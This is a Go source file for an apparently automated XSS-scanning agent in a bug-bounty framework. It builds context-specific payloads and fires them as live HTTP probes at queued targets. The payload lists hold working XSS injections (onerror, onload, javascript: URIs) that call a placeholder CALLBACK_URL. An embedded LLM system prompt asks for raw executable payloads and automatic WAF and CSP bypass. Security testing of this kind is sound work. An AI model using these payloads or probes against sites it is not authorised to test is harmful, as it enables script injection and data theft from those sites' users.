// Package xss implements the XSS specialist agent.
//
// This is a Go-native implementation that processes XSS work items from the specialist queue.
//
// It supports:
//   - Reflected XSS detection via probe injection + response analysis
//   - DOM-based XSS via JavaScript source/sink pattern matching
//   - Stored XSS via multi-request correlation
//   - WAF bypass with payload mutation
//   - OOB validation via Interactsh callbacks (future)
package xss

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

// XSSType categorizes the XSS variant.
type XSSType string

const (
	Reflected XSSType = "reflected"
	Stored    XSSType = "stored"
	DOM       XSSType = "dom"
)

// Agent implements the Specialist interface for XSS vulnerability detection.
type Agent struct {
	systemPrompt string
}

// New creates a new XSS specialist agent.
func New() *Agent {
	return &Agent{
		systemPrompt: defaultSystemPrompt,
	}
}

func (a *Agent) Name() string         { return "XSS Agent" }
func (a *Agent) ID() string           { return "xss" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

// ProcessItem processes a single XSS work item from the queue.
// This is called by the Worker for each item dequeued.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	// Extract work item details
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	priority, _ := item.Payload["priority"].(string)

	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL in work item")
	}

	// Phase 1: Context Analysis
	injectionCtx := analyzeContext(vulnContext)

	// Phase 2: Payload Generation
	payloads := generatePayloads(injectionCtx)

	// Phase 3: Extract URL parameters to inject into
	params := extractParams(targetURL)

	// Phase 4: Fire real HTTP probes
	fc := base.NewFuzzClient()
	var findings []*base.Finding

	// Limit to top 3 params, top 5 payloads per param
	maxParams := 3
	maxPayloads := 5
	if len(params) == 0 {
		params = []string{"inject"}
	}
	if len(params) > maxParams {
		params = params[:maxParams]
	}
	if len(payloads) > maxPayloads {
		payloads = payloads[:maxPayloads]
	}

	for _, paramName := range params {
		for _, payload := range payloads {
			result := fc.ProbeGET(ctx, targetURL, paramName, payload)
			if result.Error != nil {
				continue
			}

			confidence := 0.0
			evidence := map[string]interface{}{
				"context":       injectionCtx,
				"xss_type":      string(Reflected),
				"payload_class": classifyPayload(payload),
				"status_code":   result.StatusCode,
				"param":         paramName,
			}

			if base.DetectReflection(result.Body, payload) {
				confidence = 0.7
				evidence["reflected"] = true
			}
			if base.DetectXSSExecution(result.Body, payload) {
				confidence = 0.95
				evidence["executed"] = true
			}

			if confidence > 0 && result.StatusCode == 200 {
				findings = append(findings, &base.Finding{
					Type:       "XSS",
					URL:        targetURL,
					Parameter:  paramName,
					Payload:    payload,
					Severity:   mapPriorityToSeverity(priority),
					Confidence: confidence,
					Evidence:   evidence,
					Method:     "GET",
				})
			}
		}
	}

	return findings, nil
}

// extractParams returns query parameter names from a URL.
func extractParams(rawURL string) []string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	q, err := url.ParseQuery(u.RawQuery)
	if err != nil || len(q) == 0 {
		return nil
	}
	params := make([]string, 0, len(q))
	for k := range q {
		params = append(params, k)
	}
	return params
}

// analyzeContext determines the injection context from planner notes.
func analyzeContext(context string) string {
	context = strings.ToLower(context)
	switch {
	case strings.Contains(context, "attribute"):
		return "attribute_quoted"
	case strings.Contains(context, "javascript"), strings.Contains(context, "script"):
		return "javascript_string"
	case strings.Contains(context, "href"), strings.Contains(context, "src"):
		return "href"
	case strings.Contains(context, "dom"):
		return "dom"
	default:
		return "html_text"
	}
}

// generatePayloads creates context-appropriate XSS payloads.
func generatePayloads(injectionCtx string) []string {
	switch injectionCtx {
	case "html_text":
		return []string{
			`<img src=x onerror=fetch('CALLBACK_URL')>`,
			`<svg onload=fetch('CALLBACK_URL')>`,
			`<details open ontoggle=fetch('CALLBACK_URL')>`,
		}
	case "attribute_quoted":
		return []string{
			`"><img src=x onerror=fetch('CALLBACK_URL')>`,
			`" onfocus=fetch('CALLBACK_URL') autofocus="`,
			`'><svg onload=fetch('CALLBACK_URL')>`,
		}
	case "javascript_string":
		return []string{
			`";fetch('CALLBACK_URL');//`,
			`';fetch('CALLBACK_URL');//`,
			"\\`;fetch('CALLBACK_URL');//",
		}
	case "href":
		return []string{
			`javascript:fetch('CALLBACK_URL')`,
			`data:text/html,<script>fetch('CALLBACK_URL')</script>`,
		}
	case "dom":
		return []string{
			`#<img src=x onerror=fetch('CALLBACK_URL')>`,
			`javascript:fetch('CALLBACK_URL')`,
		}
	default:
		return []string{
			`<script>fetch('CALLBACK_URL')</script>`,
		}
	}
}

// classifyPayload returns the bypass technique class.
func classifyPayload(payload string) string {
	switch {
	case strings.Contains(payload, "onerror"):
		return "event_handler"
	case strings.Contains(payload, "onload"):
		return "event_handler"
	case strings.Contains(payload, "javascript:"):
		return "protocol_handler"
	case strings.Contains(payload, "<script>"):
		return "script_injection"
	case strings.Contains(payload, "onfocus"):
		return "interactive_event"
	default:
		return "generic"
	}
}

func mapPriorityToSeverity(priority string) string {
	switch strings.ToLower(priority) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	case "medium":
		return "medium"
	case "low":
		return "low"
	default:
		return "medium"
	}
}

// defaultSystemPrompt is the embedded system prompt for the XSS agent.
// In production this will be loaded from an external markdown file.
const defaultSystemPrompt = `You are an elite XSS (Cross-Site Scripting) specialist with deep expertise in:
- All XSS contexts: HTML text, attributes, JavaScript, URLs, CSS
- WAF/filter bypass techniques (case variation, encoding, alternative event handlers)
- Modern browser behaviors and CSP bypass
- Framework-specific attacks (AngularJS CSTI, Vue.js template injection)

Your task: Analyze the provided target and generate payloads that will execute JavaScript.

RULES:
1. Generate ONLY raw, executable payloads -- no explanations or instructions
2. Prefer visual proof payloads (DOM modification) over alert() for PoC
3. Consider the injection context (HTML, attribute, JS string, URL) when crafting payloads
4. If WAF is detected, automatically attempt bypass techniques
5. Report confidence level (0.0-1.0) based on reflection analysis`
